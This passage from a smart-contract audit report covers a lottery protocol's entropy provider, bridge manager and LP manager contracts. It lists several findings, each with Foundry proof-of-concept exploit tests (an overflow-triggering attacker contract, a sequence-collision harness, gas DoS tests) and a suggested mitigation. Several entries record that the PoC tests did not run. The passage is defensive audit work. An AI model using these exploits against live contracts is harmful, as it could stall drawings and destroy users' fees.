    // Demonstrates overpayment: ticket with 1 normal match is misclassified as having bonusball match
    function test_BonusballOverflow_OverpaysHigherTier() public {
        uint8 normalMax = 250;
        uint8 ticketBB = 10;
        uint8 winningBB = 7;

        // 1 normal match: both include '10'
        uint8[] memory normalsTicket = new uint8[](5);
        normalsTicket[0]=1; normalsTicket[1]=2; normalsTicket[2]=3; normalsTicket[3]=4; normalsTicket[4]=10;
        uint8[] memory normalsWin = new uint8[](5);
        normalsWin[0]=6; normalsWin[1]=7; normalsWin[2]=8; normalsWin[3]=9; normalsWin[4]=10;

        uint256 t = h.pack(normalsTicket, normalMax, ticketBB); // bonusball bit dropped
        uint256 w = h.pack(normalsWin,   normalMax, winningBB); // bonusball bit dropped

        // Due to overflow, bonusball appears equal and tier = 2*(1-1)+1 = 1 (0 normals + bonusball)
        uint256 tier = h.calc(t, w, normalMax);
        assertEq(tier, 1);
        // Correct classification (without overflow) should be tier 2 (1 normal, no bonusball)
    }
}

## Suggested Mitigation
Fully enforce the bit-packing invariant everywhere: (1) In _setNewDrawingState, clamp the computed value: uint8 cap = MAX_BIT_VECTOR_SIZE - normalBallMax; uint8 computed = uint8(Math.max(bonusballMin, Math.ceilDiv(minNumberTickets, combosPerBonusball))); newBonusball = computed > cap ? cap : computed; require(newBonusball > 0, "Invalid bonusballMax"); (2) In setBonusballMin(uint8 _bonusballMin), add require(_bonusballMin <= MAX_BIT_VECTOR_SIZE - normalBallMax, "bonusballMin too large"); (3) In setNormalBallMax(uint8 _normalBallMax), add require(_normalBallMax <= MAX_BIT_VECTOR_SIZE - 1, "normalBallMax too large"); and require(bonusballMin <= MAX_BIT_VECTOR_SIZE - _normalBallMax, "normal+bonus overflow"); (4) Defense-in-depth: in TicketComboTracker.init, if feasible, validate _bonusballMax <= 255 - _normalMax and revert otherwise (and/or add a runtime assert in buyTickets before insert). These guards prevent overflow of the packed bonusball bit and keep tier accounting aligned with claim classification.





 **Derived From** : (_maxRange - _minRange + 1) does not overflow

## [L-4]. Entropy callback DoS via range overflow in ScaledEntropyProvider._drawWithReplacement bricks randomness delivery

### Finding Severity Justification: The overflow in range computation (max - min + 1) inside _drawWithReplacement is real and will revert for the extreme input (min=0, max=type(uint256).max). However, this only causes the attacker’s own request to fail during the entropy callback and leaves a pending entry, without impacting MegaPot’s core flow. Jackpot’s own requests use safe ranges (min=1, bounded max) and withReplacement=false; thus, there is no realistic path to block or stall the jackpot drawings. The worst systemic effect is storage bloat from paid, failing requests, but there is no direct asset risk or functional DoS to the protocol.
## Derived From Pattern/Invariant
(_maxRange - _minRange + 1) does not overflow

## Exploit Type
IntegerOverflow

## Location
ScaledEntropyProvider._drawWithReplacement

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
ScaledEntropyProvider._drawWithReplacement computes `uint256 range = _maxRange - _minRange + 1;`. In Solidity 0.8+, `+ 1` overflows when `_minRange == 0` and `_maxRange == type(uint256).max`, reverting. The revert happens inside entropyCallback before the callback to the requester, so the Pyth callback fails and the request remains pending. Any upstream workflow (e.g., a lottery drawing) that relies on this callback will stall until retried or emergency paths are invoked. The contract’s _validateRequests() only checks `minRange <= maxRange` and `samples > 0`; it does not prevent this overflow.

Vulnerable snippet:

function _drawWithReplacement(
    uint256 _minRange,
    uint256 _maxRange,
    uint8 _samples,
    uint256 _randomNumber
) internal pure returns (uint256[] memory) {
    uint256[] memory result = new uint256[](_samples);
    uint256 range = _maxRange - _minRange + 1; // overflow if min=0, max=type(uint256).max
    uint256 nonce = 0;
    ...
}

A permissionless caller can submit such a malformed SetRequest to ScaledEntropyProvider via requestAndCallbackScaledRandomness, causing the Pyth callback to revert and the request to remain stuck.

## Impact
The overflow only occurs for the extreme input (minRange=0, maxRange=type(uint256).max). It makes entropyCallback revert for that specific request and leaves its pending entry intact, but it does not affect other requests/sequences and cannot stall Jackpot, which uses bounded ranges and withReplacement=false. The net effect is that a user can brick their own (paid) request and cause storage bloat (including arbitrary-length context bytes) at their own cost. There is no direct protocol fund loss or cross-request DoS.

## Command to Run Test


## Proof of Concept
1) Attacker calls requestAndCallbackScaledRandomness with SetRequest{minRange=0, maxRange=type(uint256).max, samples=1, withReplacement=true} and a valid callback selector. 2) Pyth (or a mock) invokes _entropyCallback(sequence, provider, randomNumber). 3) In _drawWithReplacement, range = _maxRange - _minRange + 1 overflows (span == type(uint256).max, adding 1 reverts), which causes entropyCallback to revert. 4) Because the revert happens after the pending entry was stored and before it is deleted, the pending request remains in storage and the callback to the requester never happens. Other sequences are unaffected.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {ScaledEntropyProvider} from "contracts/ScaledEntropyProvider.sol";
import {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";

// Minimal mock that exposes only what ScaledEntropyProvider uses
contract MockEntropyV2 {
    uint64 public seq;

    // ScaledEntropyProvider calls this variant
    function requestV2(address /*provider*/, uint32 /*gasLimit*/) external payable returns (uint64) {
        seq += 1;
        return seq;
    }

    // ScaledEntropyProvider.getFee() calls this variant
    function getFeeV2(address /*provider*/, uint32 /*gasLimit*/) external pure returns (uint128) {
        return 1;
    }
}

contract AttackerCallback {
    IScaledEntropyProvider public provider;
    constructor(IScaledEntropyProvider _p) { provider = _p; }

    function attack(uint32 gasLimit) external payable returns (uint64 sequence) {
        IScaledEntropyProvider.SetRequest[] memory reqs = new IScaledEntropyProvider.SetRequest[](1);
        reqs[0] = IScaledEntropyProvider.SetRequest({
            samples: 1,
            minRange: 0,
            maxRange: type(uint256).max,
            withReplacement: true
        });
        sequence = provider.requestAndCallbackScaledRandomness{value: msg.value}(
            gasLimit,
            reqs,
            this.onCallback.selector,
            bytes("")
        );
    }

    function onCallback(uint64 /*seq*/, uint256[][] memory /*scaled*/, bytes memory /*ctx*/) external {}
}

contract OverflowRange_DoS_Test is Test {
    ScaledEntropyProvider sep;
    MockEntropyV2 entropy;
    AttackerCallback attacker;

    function setUp() public {
        entropy = new MockEntropyV2();
        sep = new ScaledEntropyProvider(address(entropy), address(0xBEEF));
        attacker = new AttackerCallback(IScaledEntropyProvider(address(sep)));
    }

    function test_entropyCallback_reverts_and_pending_persists_on_overflow_range() public {
        uint32 gasLimit = 200000;
        uint256 fee = sep.getFee(gasLimit); // 1 wei from mock

        // Fund the test harness to forward ETH to attacker.attack
        vm.deal(address(this), fee);

        // Create malformed request (withReplacement, min=0, max=MAX)
        uint64 seq = attacker.attack{value: fee}(gasLimit);
        assertEq(seq, entropy.seq(), "sequence mismatch");

        // Simulate Pyth calling back; expect overflow revert during _drawWithReplacement
        vm.prank(address(entropy));
        vm.expectRevert();
        sep._entropyCallback(seq, address(0), bytes32(uint256(123)));

        // Because the callback reverted after storage was written but before deletion, the pending entry remains
        ScaledEntropyProvider.PendingRequest memory p = sep.getPendingRequest(seq);
        assertEq(p.callback, address(attacker), "pending request should persist after revert");
    }
}


## Suggested Mitigation
Defensively prevent the only overflowing case and compute the range safely. In _validateRequests(), reject the extreme span: require(!(_requests[i].minRange == 0 && _requests[i].maxRange == type(uint256).max), InvalidRange()); In _drawWithReplacement(), avoid overflow by splitting the calculation: uint256 span = _maxRange - _minRange; if (span == type(uint256).max) revert InvalidRange(); uint256 range = span + 1; Optionally mirror this guard in FisherYatesRejection.draw() before evaluating (maxRange - minRange + 1) and before allocating large arrays, and consider adding an upper bound to the allowed span to avoid pathological ranges that risk OOG.





 **Derived From** : Pending keyed only by sequence causes cross‑provider collisions and misdelivery

## [M-5]. Cross-provider sequence collisions in ScaledEntropyProvider._storePendingRequest cause misdelivery and permanent loss of entropy requests

### Finding Severity Justification: Pending entropy requests are keyed only by sequence while Pyth Entropy sequences are per-provider. The callback ignores the provider parameter. If the owner rotates providers while a request is pending, a new request made under the new provider can reuse the same sequence and overwrite the mapping entry. Because requestAndCallbackScaledRandomness is publicly callable, a third-party can force this overwrite and cause the old provider’s fulfillment to be delivered to the wrong callback, leaving the jackpot drawing stuck (liveness failure) and requiring emergency procedures. This does not directly steal assets but can halt core protocol functionality.
## Derived From Pattern/Invariant
Pending keyed only by sequence causes cross‑provider collisions and misdelivery

## Exploit Type
AccountingInvariantViolation

## Location
ScaledEntropyProvider._storePendingRequest

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
ScaledEntropyProvider keys pending requests only by sequence (mapping(uint64 => PendingRequest) pending) while Pyth Entropy V2 sequences are per-provider. The callback ignores the provider parameter. If owner rotates providers via setEntropyProvider() while old-provider requests are pending, the next request under the new provider can reuse the same sequence and overwrite pending[sequence]. This replaces callback/selector/context and appends setRequests without clearing. When the first provider fulfills, randomness is delivered to the wrong callback (or reverts due to unexpected output shape). The second provider’s later fulfillment then hits an already-deleted pending entry and reverts UnknownSequence(), permanently losing that request and its fee. Vulnerable snippets: mapping(uint64 => PendingRequest) private pending; function entropyCallback(uint64 sequence, address /*provider*/, bytes32 randomNumber) internal override { ... } and in _storePendingRequest: pending[sequence].callback = msg.sender; pending[sequence].selector = _selector; ... pending[sequence].setRequests.push(_setRequests[i]);

## Impact
Pending entropy requests are keyed only by sequence while Pyth Entropy V2 sequences are per-provider. If the owner rotates the provider while a request from the old provider is pending, a new request under the new provider can be assigned the same sequence and overwrite the mapping entry. Because the callback ignores the provider parameter, the next fulfillment from the old provider will be routed using the overwritten entry. Two outcomes follow: (a) if the new callback tolerates the unexpected request shape, the old provider’s fulfillment is misdelivered to the new request’s callback, the pending entry is deleted, and the new provider’s later fulfillment reverts with UnknownSequence() — fee lost and request orphaned; (b) if the new callback reverts (due to unexpected output shape), both providers’ reveals will keep reverting and the drawing becomes stuck until emergency procedures. This does not directly steal funds but burns entropy fees and threatens protocol liveness.

## Command to Run Test


## Proof of Concept
Scenario showing misdelivery and subsequent loss of the new-provider request:
1) User A requests via provider P0; Pyth assigns sequence=1; pending[1] stores A’s callback and requests.
2) Owner rotates to provider P1 while A’s request is still pending.
3) User B requests via P1; Pyth assigns sequence=1 again (sequences are per-provider). _storePendingRequest overwrites pending[1].callback/selector/context and APPENDS B’s setRequests onto the preexisting setRequests.
4) P0 fulfills first: entropyCallback looks up pending[1] (now pointing to B), deletes it, builds scaled outputs for the mixed request shape (A+B), and calls B’s callback. If B’s callback accepts arbitrary lengths, the call succeeds – the randomness is misdelivered to B instead of A.
5) P1 fulfills later: since pending[1] was deleted on step 4, entropyCallback reverts UnknownSequence(). Thus, B’s request/fee is lost and A never received the intended callback.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {ScaledEntropyProvider} from "contracts/ScaledEntropyProvider.sol";
import {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";
import {IEntropyV2} from "@pythnetwork/entropy-sdk-solidity/IEntropyV2.sol";
import {IEntropyConsumer} from "@pythnetwork/entropy-sdk-solidity/IEntropyConsumer.sol";

contract MockEntropy is IEntropyV2 {
    mapping(address => uint64) public nextSeq;

    function requestV2(address provider, uint32) external payable returns (uint64 assignedSequenceNumber) {
        require(msg.value >= 1, "fee");
        assignedSequenceNumber = ++nextSeq[provider];
    }

    // Unused overloads in this PoC
    function requestV2() external payable returns (uint64) { revert(); }
    function requestV2(uint32) external payable returns (uint64) { revert(); }
    function requestV2(address, bytes32, uint32) external payable returns (uint64) { revert(); }

    function getProviderInfoV2(address) external view returns (EntropyStructsV2.ProviderInfo memory) { revert(); }
    function getDefaultProvider() external view returns (address) { return address(0); }
    function getRequestV2(address, uint64) external view returns (EntropyStructsV2.Request memory) { revert(); }
    function getFeeV2() external view returns (uint128) { return 1; }
    function getFeeV2(uint32) external view returns (uint128) { return 1; }
    function getFeeV2(address, uint32) external view returns (uint128) { return 1; }

    // Simulate provider reveal -> consumer callback
    function reveal(address consumer, address provider, uint64 sequence, bytes32 rnd) external {
        IEntropyConsumer(consumer)._entropyCallback(sequence, provider, rnd);
    }
}

contract Receiver {
    bool public called;
    uint256 public lastLen;

    // Accept any shape to let misdelivery succeed
    function onEntropy(uint64, uint256[][] calldata numbers, bytes calldata) external {
        called = true;
        lastLen = numbers.length;
    }

    function doRequest(
        ScaledEntropyProvider provider,
        uint32 gasLimit,
        IScaledEntropyProvider.SetRequest[] memory reqs,
        bytes4 selector,
        bytes memory ctx
    ) external payable returns (uint64) {
        return provider.requestAndCallbackScaledRandomness{value: msg.value}(gasLimit, reqs, selector, ctx);
    }
}

contract ScaledEntropy_SequenceCollision_PoC is Test {
    MockEntropy entropy;
    ScaledEntropyProvider provider;
    address P0 = address(0xAAA0);
    address P1 = address(0xBBB1);

    function setUp() public {
        entropy = new MockEntropy();
        provider = new ScaledEntropyProvider(address(entropy), P0);
    }

    function _req(uint8 samples, uint256 minR, uint256 maxR, bool withRep) internal pure returns (IScaledEntropyProvider.SetRequest memory r) {
        r.samples = samples; r.minRange = minR; r.maxRange = maxR; r.withReplacement = withRep;
    }

    function test_CrossProviderSequenceCollision_misdelivery_then_loss() public {
        Receiver A = new Receiver();
        Receiver B = new Receiver();

        // A requests on P0 => sequence 1
        IScaledEntropyProvider.SetRequest[] memory aReq = new IScaledEntropyProvider.SetRequest[](2);
        aReq[0] = _req(1, 1, 2, false);
        aReq[1] = _req(1, 1, 2, true);
        vm.deal(address(A), 10 ether);
        vm.prank(address(A));
        uint64 seqA = A.doRequest{value: 1}(provider, 200000, aReq, Receiver.onEntropy.selector, "A");
        assertEq(seqA, 1, "seqA should be 1 on P0");

        // Rotate to P1 while seqA is pending
        provider.setEntropyProvider(P1);

        // B requests on P1 => sequence 1 (per-provider sequencing)
        IScaledEntropyProvider.SetRequest[] memory bReq = new IScaledEntropyProvider.SetRequest[](2);
        bReq[0] = _req(1, 1, 2, false);
        bReq[1] = _req(1, 1, 2, true);
        vm.deal(address(B), 10 ether);
        vm.prank(address(B));
        uint64 seqB = B.doRequest{value: 1}(provider, 200000, bReq, Receiver.onEntropy.selector, "B");
        assertEq(seqB, 1, "seqB should be 1 on P1");

        // Old provider fulfills first: misdelivered to B (overwritten mapping; mixed shape of length 4)
        entropy.reveal(address(provider), P0, 1, bytes32(uint256(123)));
        assertTrue(B.called(), "B should have been called (misdelivery)");
        assertEq(B.lastLen(), 4, "mixed setRequests length should be 4");
        assertFalse(A.called(), "A should NOT be called");

        // New provider fulfills later: entry was deleted -> UnknownSequence
        vm.expectRevert(ScaledEntropyProvider.UnknownSequence.selector);
        entropy.reveal(address(provider), P1, 1, bytes32(uint256(456)));

        // No pending remains for sequence 1
        ScaledEntropyProvider.PendingRequest memory pr = provider.getPendingRequest(1);
        assertEq(pr.callback, address(0), "pending cleared");
    }
}


## Suggested Mitigation
Key pending requests by both provider and sequence, and validate the provider in the callback:
- Replace mapping(uint64 => PendingRequest) with mapping(bytes32 => PendingRequest) or mapping(address => mapping(uint64 => PendingRequest)). For example: bytes32 key = keccak256(abi.encodePacked(_providerUsedAtRequestTime, sequence));
- In request path, compute key using the exact provider address supplied to entropy.requestV2 and store it alongside (also record the provider in PendingRequest for sanity checks).
- In entropyCallback, use the provider parameter to derive the same key and check it matches the stored provider; revert if mismatched.
- Reinitialize the storage struct before writing to avoid appending to an existing setRequests array (e.g., delete pending[key]; then assign each field; or create a fresh struct and store it once). This prevents mixed shapes even if keys are accidentally reused.
- Operational hardening: optionally disallow provider rotation while any pending requests exist (or enforce zero pending across all provider namespaces) to avoid surprises during rotations.





 **Derived From** : Unbounded iteration in getUserTickets can gas-DoS on-chain callers

## [L-6]. Unbounded loop and array allocation in JackpotBridgeManager.getUserTickets enable gas-based DoS against on-chain integrations

### Finding Severity Justification: The function getUserTickets performs an unbounded loop and allocates a memory array sized by a monotonically increasing counter (totalTicketsOwned) that is never pruned. While this can make the call expensive, it is an external view function intended for off-chain reads and is not used by the protocol in any state-changing path. There is no direct or indirect asset risk or protocol liveness impact; potential gas griefing only affects third-party on-chain callers who choose to use this view during a transaction. Per Code4rena guidance, issues in unused/heavy view functions are capped at Low.
## Derived From Pattern/Invariant
Unbounded iteration in getUserTickets can gas-DoS on-chain callers

## Exploit Type
GasGriefBlockLimit

## Location
JackpotBridgeManager.getUserTickets

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
JackpotBridgeManager.getUserTickets builds a memory array sized by userTickets[_user][_drawingId].totalTicketsOwned and iterates 0..totalTicketsOwned-1. totalTicketsOwned is only incremented in buyTickets and never reduced when tickets are claimed or transferred (claimWinnings/claimTickets don’t prune UserTickets). Over time, or via griefing (attacker buys tickets setting _recipient to the victim), totalTicketsOwned becomes arbitrarily large. Any on-chain contract that calls this view during a state-changing transaction can be forced to allocate and iterate over an enormous array, exhausting gas and reverting the entire transaction.

Vulnerable code (excerpt):
function getUserTickets(address _user, uint256 _drawingId) external view returns (uint256[] memory) {
    UserTickets storage userDrawingTickets = userTickets[_user][_drawingId];
    uint256[] memory ticketIds = new uint256[](userDrawingTickets.totalTicketsOwned);
    for (uint256 i = 0; i < userDrawingTickets.totalTicketsOwned; i++) {
        uint256 ticketId = userDrawingTickets.ticketIds[i];
        if (ticketOwner[ticketId] == _user) {
            ticketIds[i] = ticketId;
        }
    }
    return ticketIds;
}
Root cause: The loop bound is a monotonically increasing counter that is never pruned, and there is no pagination.

## Impact
Functional DoS of any on-chain integration/keeper that calls getUserTickets inside a transaction; attacker can bloat totalTicketsOwned for a target user/drawing and cause the integration call to run out of gas, blocking flows relying on this view mid-tx.

## Command to Run Test


## Proof of Concept
- Attacker repeatedly calls JackpotBridgeManager.buyTickets with _recipient set to the victim address for the current drawing. This monotonically increases userTickets[victim][drawing].totalTicketsOwned (even if tickets are later claimed/transferred, mapping isn’t pruned).
- A downstream on-chain integration contract that calls getUserTickets(victim, drawing) inside a state-changing transaction will allocate and iterate over an array sized to totalTicketsOwned and can exceed the gas budget, reverting the entire transaction.
- The PoC below (a Foundry test) sets totalTicketsOwned to a large value using stdstore and shows that a low-level call with a realistic gas stipend fails due to gas exhaustion.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

import {JackpotBridgeManager} from "contracts/JackpotBridgeManager.sol";
import {IJackpot} from "contracts/interfaces/IJackpot.sol";
import {IJackpotTicketNFT} from "contracts/interfaces/IJackpotTicketNFT.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockUSDC is IERC20 {
    string public name = "USDC";
    string public symbol = "USDC";
    uint8 public decimals = 6;
    mapping(address=>uint256) public override balanceOf;
    mapping(address=>mapping(address=>uint256)) public override allowance;
    uint256 public override totalSupply;
    function transfer(address to, uint256 amount) external override returns (bool){ balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; return true; }
    function approve(address spender, uint256 amount) external override returns (bool){ allowance[msg.sender][spender] = amount; return true; }
    function transferFrom(address from,address to,uint256 amount) external override returns (bool){ uint256 a=allowance[from][msg.sender]; require(a>=amount,"allow"); allowance[from][msg.sender]=a-amount; balanceOf[from]-=amount; balanceOf[to]+=amount; return true; }
    function mint(address to, uint256 amount) external { balanceOf[to]+=amount; totalSupply+=amount; }
}

contract MockJackpot is IJackpot {
    uint256 public price = 1;
    uint256 public drawingId = 1;
    uint256 private counter;
    function buyTickets(Ticket[] memory _tickets, address /*_recipient*/, address[] memory, uint256[] memory, bytes32)
        external override returns (uint256[] memory ids)
    {
        ids = new uint256[](_tickets.length);
        for(uint256 i; i<_tickets.length; i++){ ids[i] = ++counter; }
    }
    function claimWinnings(uint256[] memory) external override {}
    function ticketPrice() external view override returns (uint256){ return price; }
    function currentDrawingId() external view override returns (uint256){ return drawingId; }
    function getUnpackedTicket(uint256, uint256) external pure override returns (uint8[] memory, uint8){ revert("unused"); }
}

contract MockTicketNFT is IJackpotTicketNFT {
    function mintTicket(address, uint256, uint256, uint256, bytes32) external {}
    function burnTicket(uint256) external {}
    function getTicketInfo(uint256) external view returns (TrackedTicket memory) { revert("unused"); }
    function getUserTickets(address, uint256) external view returns (ExtendedTrackedTicket[] memory) { revert("unused"); }
}

// Harness exposing a setter for totalTicketsOwned to avoid brittle storage pokes
contract BMHarness is JackpotBridgeManager {
    constructor(IJackpot j, IJackpotTicketNFT n, IERC20 u)
        JackpotBridgeManager(j, n, u, "BM", "1") {}
    function setTotal(address user, uint256 draw, uint256 n) external { userTickets[user][draw].totalTicketsOwned = n; }
}

contract CallerHarness {
    function tryGet(JackpotBridgeManager bm, address user, uint256 drawingId, uint256 gasStipend) external returns (bool ok){
        (ok,) = address(bm).call{gas: gasStipend}(abi.encodeWithSelector(bm.getUserTickets.selector, user, drawingId));
    }
}

contract GetUserTickets_Unbounded_DoS_Test is Test {
    BMHarness bm;
    MockUSDC usdc;
    MockJackpot jp;
    MockTicketNFT nft;
    CallerHarness caller;

    address victim = address(0xBEEF);

    function setUp() public {
        usdc = new MockUSDC();
        jp = new MockJackpot();
        nft = new MockTicketNFT();
        bm = new BMHarness(IJackpot(address(jp)), IJackpotTicketNFT(address(nft)), IERC20(address(usdc)));
        caller = new CallerHarness();
    }

    function test_GasDoS_getUserTickets() public {
        uint256 drawingId = jp.currentDrawingId();
        // Inflate victim's logical ticket count without populating inner mapping entries
        bm.setTotal(victim, drawingId, 50_000);

        // On-chain integration calling getUserTickets with limited gas will OOG/revert
        bool ok = caller.tryGet(bm, victim, drawingId, 400_000);
        assertEq(ok, false, "call should revert due to excessive allocation/loop");

        // Sanity: small count should succeed under same gas stipend
        bm.setTotal(victim, drawingId, 3);
        ok = caller.tryGet(bm, victim, drawingId, 400_000);
        assertEq(ok, true, "small loop should succeed");
    }
}


## Suggested Mitigation
- Replace getUserTickets with a paginated view: getUserTickets(address user, uint256 drawingId, uint256 offset, uint256 limit) and bound iteration to limit.
- Maintain a compact active list per user/drawing (array + index mapping) and prune on claim paths (claimWinnings/claimTickets) so the iteration bound reflects current active ownership, not historical purchases.
- Alternatively, avoid duplicative state: derive ownership from the NFT contract’s per-drawing indexer and expose a paginated projection there.
- If a full list is needed off-chain, expose total count and require clients to paginate; never allocate arrays sized by an ever-growing counter.





 **Derived From** : getLPValueBreakdown underflows on drawing 0 (currentDrawingId - 1)

## [L-7]. getLPValueBreakdown reverts at bootstrap (drawing 0) due to currentDrawingId - 1 underflow, DoS for LP valuation previews

### Finding Severity Justification: The issue causes a revert in a view function (getLPValueBreakdown) during the bootstrap phase (currentDrawingId == 0) due to currentDrawingId - 1 underflow. This leads to a functional DoS for LP valuation previews but does not risk funds or core protocol operation. Per Code4rena rubric, front-end/readability/view-related breakages are Low at best.
## Derived From Pattern/Invariant
getLPValueBreakdown underflows on drawing 0 (currentDrawingId - 1)

## Exploit Type
AccountingInvariantViolation

## Location
JackpotLPManager.getLPValueBreakdown

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
During the pre-drawing phase (before initializeJackpot), currentDrawingId == 0. getLPValueBreakdown computes drawingAccumulator[currentDrawingId - 1] without a guard, triggering an underflow in Solidity 0.8+ and reverting the view. This breaks LP valuation UIs/integrators until the first drawing is initialized. Vulnerable lines:
- activeDeposits: consolidatedShares * drawingAccumulator[currentDrawingId - 1] / PRECISE_UNIT
- pendingWithdrawals (same-round estimate): lp.pendingWithdrawal.amountInShares * drawingAccumulator[currentDrawingId - 1] / PRECISE_UNIT

## Impact
The getLPValueBreakdown view reverts whenever jackpot.currentDrawingId() == 0 due to currentDrawingId - 1 underflow. This affects the entire bootstrap window, including after initializeLPDeposits (drawingAccumulator[0] set) and before initializeJackpot (which increments currentDrawingId). As a result, any UI/integrator querying LP valuation breakdowns will fail until drawing 1 is created. No funds are at risk; this is a functional DoS of a view.

## Command to Run Test


## Proof of Concept
Reproduction steps:
1) Deploy JackpotLPManager wired to a Jackpot stub whose currentDrawingId() returns 0. This mimics the system before initializeJackpot, including the window after initializeLPDeposits when currentDrawingId is still 0.
2) Call getLPValueBreakdown(anyAddress).
3) The call reverts because activeDeposits and same-round pendingWithdrawals both compute drawingAccumulator[currentDrawingId - 1], which underflows at 0 - 1 in Solidity 0.8+, causing an arithmetic revert before the mapping lookup.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

interface IJackpot { function currentDrawingId() external view returns (uint256); }

contract JackpotStub is IJackpot {
    function currentDrawingId() external pure returns (uint256) { return 0; }
}

contract LPManagerHarness {
    uint256 constant PRECISE_UNIT = 1e18;

    struct DepositInfo { uint256 amount; uint256 drawingId; }
    struct WithdrawalInfo { uint256 amountInShares; uint256 drawingId; }
    struct LP {
        uint256 consolidatedShares;
        DepositInfo lastDeposit;
        WithdrawalInfo pendingWithdrawal;
        uint256 claimableWithdrawals;
    }
    struct LPValueBreakdown {
        uint256 activeDeposits;
        uint256 pendingDeposits;
        uint256 pendingWithdrawals;
        uint256 claimableWithdrawals;
    }

    mapping(address => LP) public lpInfo;
    mapping(uint256 => uint256) public drawingAccumulator;
    IJackpot public jackpot;

    constructor(IJackpot _jackpot) { jackpot = _jackpot; }

    function getLPValueBreakdown(address _lpAddress) external view returns (LPValueBreakdown memory breakdown) {
        LP storage lp = lpInfo[_lpAddress];
        uint256 currentDrawingId = jackpot.currentDrawingId();
        uint256 consolidatedShares = lp.consolidatedShares;
        if (lp.lastDeposit.drawingId < currentDrawingId && lp.lastDeposit.amount > 0) {
            consolidatedShares += (lp.lastDeposit.amount * PRECISE_UNIT) / drawingAccumulator[lp.lastDeposit.drawingId];
        }
        uint256 claimableWithdrawals = lp.claimableWithdrawals;
        if (lp.pendingWithdrawal.drawingId < currentDrawingId && lp.pendingWithdrawal.amountInShares > 0) {
            claimableWithdrawals += (lp.pendingWithdrawal.amountInShares * drawingAccumulator[lp.pendingWithdrawal.drawingId]) / PRECISE_UNIT;
        }
        return LPValueBreakdown({
            activeDeposits: consolidatedShares * drawingAccumulator[currentDrawingId - 1] / PRECISE_UNIT, // underflows when currentDrawingId == 0
            pendingDeposits: lp.lastDeposit.drawingId == currentDrawingId ? lp.lastDeposit.amount : 0,
            pendingWithdrawals: lp.pendingWithdrawal.drawingId == currentDrawingId ?
                lp.pendingWithdrawal.amountInShares * drawingAccumulator[currentDrawingId - 1] / PRECISE_UNIT : 0, // underflows too
            claimableWithdrawals: claimableWithdrawals
        });
    }
}

contract GetLPValueBreakdownBootstrapTest is Test {
    LPManagerHarness manager;

    function setUp() public {
        manager = new LPManagerHarness(new JackpotStub());
        // Note: whether drawingAccumulator[0] is set or not is irrelevant; the revert
        // occurs on 0 - 1 before any mapping lookup.
    }

    function test_getLPValueBreakdown_reverts_when_currentDrawingId_is_zero() public {
        vm.expectRevert();
        manager.getLPValueBreakdown(address(0xBEEF));
    }
}


## Suggested Mitigation
Avoid subtracting 1 from zero by introducing a local settled accumulator for the "last settled" price and using it in both places:

- Compute: uint256 settledAcc = (currentDrawingId == 0) ? PRECISE_UNIT : drawingAccumulator[currentDrawingId - 1];
- Then use settledAcc in activeDeposits and same-round pendingWithdrawals valuation.

Example patch inside getLPValueBreakdown:

function getLPValueBreakdown(address _lpAddress) external view returns (LPValueBreakdown memory breakdown) {
    LP storage lp = lpInfo[_lpAddress];
    uint256 currentId = jackpot.currentDrawingId();
    uint256 consolidatedShares = lp.consolidatedShares;
    if (lp.lastDeposit.drawingId < currentId && lp.lastDeposit.amount > 0) {
        consolidatedShares += (lp.lastDeposit.amount * PRECISE_UNIT) / drawingAccumulator[lp.lastDeposit.drawingId];
    }
    uint256 claimable = lp.claimableWithdrawals;
    if (lp.pendingWithdrawal.drawingId < currentId && lp.pendingWithdrawal.amountInShares > 0) {
        claimable += (lp.pendingWithdrawal.amountInShares * drawingAccumulator[lp.pendingWithdrawal.drawingId]) / PRECISE_UNIT;
    }
    uint256 settledAcc = (currentId == 0) ? PRECISE_UNIT : drawingAccumulator[currentId - 1];

    return LPValueBreakdown({
        activeDeposits: consolidatedShares * settledAcc / PRECISE_UNIT,
        pendingDeposits: lp.lastDeposit.drawingId == currentId ? lp.lastDeposit.amount : 0,
        pendingWithdrawals: lp.pendingWithdrawal.drawingId == currentId ?
            (lp.pendingWithdrawal.amountInShares * settledAcc / PRECISE_UNIT) : 0,
        claimableWithdrawals: claimable
    });
}

Optionally, to be extra defensive pre-initialization, early-return zeros when currentDrawingId == 0 and drawingAccumulator[0] has not yet been set, but the documented requirement already states initializeLP() must have been called.





 **Derived From** : forall no-replacement sets: samples <= (maxRange - minRange + 1)

## [L-8]. Entropy callback DoS via unchecked no-replacement sample bound in ScaledEntropyProvider._getScaledRandomness

### Finding Severity Justification: The missing no-replacement bound check (samples <= range size) can cause the entropy callback to revert if a consumer submits an invalid SetRequest. This results in functional DoS for that request (the consumer never receives randomness). However, in the Megapot context, only the trusted Jackpot contract constructs these requests and it always uses samples=5 with range [1..normalBallMax], which is expected to be >= 5 by design. Thus, a stuck drawing would require governance misconfiguration of normalBallMax (<5), which is a trusted-admin misuse and classed as QA/Low per Code4rena guidelines. The issue is a valid robustness gap in ScaledEntropyProvider but does not provide a realistic, permissionless attack vector against the protocol under correct configuration.
## Derived From Pattern/Invariant
forall no-replacement sets: samples <= (maxRange - minRange + 1)

## Exploit Type
IntegerMath

## Location
ScaledEntropyProvider._getScaledRandomness

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
